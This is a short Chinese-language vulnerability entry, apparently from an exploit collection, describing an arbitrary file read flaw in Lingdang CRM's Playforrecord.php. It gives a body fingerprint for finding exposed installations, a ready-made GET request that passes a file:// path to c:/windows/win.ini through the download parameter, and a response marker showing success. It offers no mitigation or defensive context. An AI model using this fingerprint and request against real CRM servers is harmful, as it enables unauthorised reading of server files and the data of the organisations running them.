# 灵当CRMPlayforrecord.php任意文件读取漏洞

灵当CRMPlayforrecord.php ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
- **请求**：`GET /crm/modules/Accounts/Playforrecord.php?download=file:///c:/windows/win.ini HTTP/1.1`
- **响应特征**：200 [Mail]